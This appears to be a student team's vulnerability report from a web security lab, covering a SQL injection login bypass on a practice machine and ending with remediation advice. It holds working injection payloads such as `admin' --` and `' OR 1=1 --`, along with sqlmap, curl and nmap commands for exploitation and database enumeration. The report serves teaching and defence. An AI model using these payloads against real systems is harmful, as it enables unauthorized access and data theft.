CVE-ID: EDU-WEBLAB-2026-TEAM2-005

Title:    Authentication Bypass via SQL Injection in Login Form Enabling Full Unauthorized Administrative Access

Affected Lab:    sqli-breach

Component:    Web Application Authentication — Login Form Username Input Field

Severity:    Critical

CVSS Vector:    CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

CVSS Score:    10.0

Description:
A critical SQL injection vulnerability was identified in the login form of the sqli-breach machine, where the username input field fails to sanitize or parameterize user-supplied input before incorporating it directly into a backend SQL query. The vulnerability exists because the application constructs authentication queries through unsafe string concatenation rather than using parameterized statements or prepared queries, allowing an attacker to inject the payload `admin' --` to prematurely terminate the SQL logic and comment out the password verification condition entirely. This forces the database to evaluate the query as inherently true for the target account, returning a valid authenticated session without any knowledge of the correct password. Successful exploitation grants the attacker full unauthorized access to the administrative interface, exposing all application data, user records, and system configurations to compromise. The combination of zero authentication requirements, network accessibility, and the complete bypass of all credential verification mechanisms classifies this as the most severe category of authentication vulnerability, warranting immediate remediation.

Proof of Concept:sql

Basic authentication bypass payload entered in the username field:
admin' --

Resulting backend SQL query after injection (reconstructed):
-- Original query structure:
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything';

The double dash (--) comments out the password check, so the database evaluates:
SELECT * FROM users WHERE username = 'admin';
--Returns a valid row → authentication succeeds without password verification

-- Alternative bypass payloads for other query structures:
' OR '1'='1' --
' OR 1=1 --
admin'/*

bash
Automated confirmation using sqlmap against the login endpoint:
sqlmap -u "http://<target-ip>/login" \
--data="username=admin&password=test" \
--level=3 --risk=2 \
--dbms=mysql \
--technique=B,E,S \
--batch \
--forms


Steps to Reproduce:
1. Launch Kali Linux and perform a service scan to identify the web application port on the sqli-breach machine: `nmap -sV -p 80,443,8080 <target-ip>`
2. Open a web browser and navigate to the application's login page: `http://<target-ip>/login`
3. In the username field, enter a standard value such as `admin` and any incorrect password, then submit — observe that authentication fails as expected, confirming a login control is in place
4. Return to the login form and enter the SQL injection payload `admin' --` in the username field
5. Enter any arbitrary value (e.g., `test`) in the password field, as the password check will be rendered irrelevant by the injection
6. Submit the login form and observe that authentication succeeds, redirecting to the administrative dashboard without any valid password being supplied
7. Navigate through the authenticated session to confirm full administrative privileges are granted, including access to user accounts, sensitive data, and application configuration panels
8. Open a terminal and confirm the injection is exploitable programmatically via curl: `curl -s -X POST http://<target-ip>/login -d "username=admin' --&password=test" -c session.txt -L`
9. Access a protected resource using the captured session cookie to verify persistent authenticated access: `curl -s http://<target-ip>/admin -b session.txt`
10. Optionally, run sqlmap to enumerate the underlying database and confirm the full scope of database exposure: `sqlmap -u "http://<target-ip>/login" --data="username=admin&password=test" --dbs --batch`
11. Review the extracted database contents and confirm that all application data is accessible to a fully unauthenticated remote attacker

Remediation:
1.    Immediately replace all dynamic SQL string concatenation with parameterized queries (prepared statements)    — for example, in PHP: `$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?"); $stmt->execute([$username, $hashedPassword]);` — this ensures user input is always treated as data, never as executable SQL syntax
2. Implement strict server-side input validation for all login fields — reject inputs containing SQL metacharacters such as single quotes (`'`), double dashes (`--`), semicolons (`;`), and comment sequences before they reach any database layer
3. Apply the principle of least privilege to all database accounts used by the application — the web application's database user should have only `SELECT` permissions on necessary tables and must not hold `DROP`, `INSERT`, `UPDATE`, `ALTER`, or administrative database rights
4. Implement a Web Application Firewall (WAF) with ruleset coverage for SQL injection patterns (e.g., ModSecurity with the OWASP Core Rule Set) to detect and block malicious payloads at the perimeter before they reach application logic
5. Enforce account lockout and rate-limiting on the login endpoint to prevent automated SQL injection enumeration and brute-force attempts — block or throttle after 5 consecutive failed attempts per IP address
6. Hash all stored passwords using a strong adaptive algorithm such as `bcrypt`, `scrypt`, or `Argon2` with an appropriate work factor — this ensures that even if database contents are exfiltrated via SQL injection, plaintext credentials are not directly recoverable
7. Conduct a full audit of all other input fields, search parameters, API endpoints, and query parameters throughout the application for the same class of SQL injection vulnerability, as the affected codebase likely uses the same unsafe query construction pattern elsewhere

Discovered By:    Team 2

Date:    February 20, 2026
